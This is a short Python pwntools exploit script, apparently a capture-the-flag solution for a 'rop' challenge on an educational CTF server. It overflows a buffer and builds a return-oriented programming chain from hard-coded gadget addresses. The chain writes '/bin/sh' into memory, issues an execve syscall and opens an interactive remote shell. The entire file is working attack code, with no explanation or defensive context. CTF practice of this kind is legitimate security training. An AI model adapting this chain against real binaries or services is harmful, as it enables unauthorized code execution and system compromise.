from pwn import *

local = False
elf = 'rop' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10173
    r = remote(ip,port)

context.arch = 'amd64'

raw_input("aaa")

pop_rax = 0x415714
pop_rdi = 0x400686
pop_rsi = 0x4100f3
pop_rdx = 0x449935
mov_rdi_rsi = 0x44709b # mov qword ptr [rdi], rsi ; ret
write = 0x6b8000
syscall = 0x47b68f

rop = "a" * (0x30 + 8)
rop += p64(pop_rdi)
rop += p64(write)
rop += p64(pop_rsi)
rop += "/bin/sh\0"
rop += p64(mov_rdi_rsi)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(0)
rop += p64(pop_rax)
rop += p64(0x3b)
rop += p64(syscall)

print r.recvuntil(':D')
r.sendline(rop)

r.interactive()
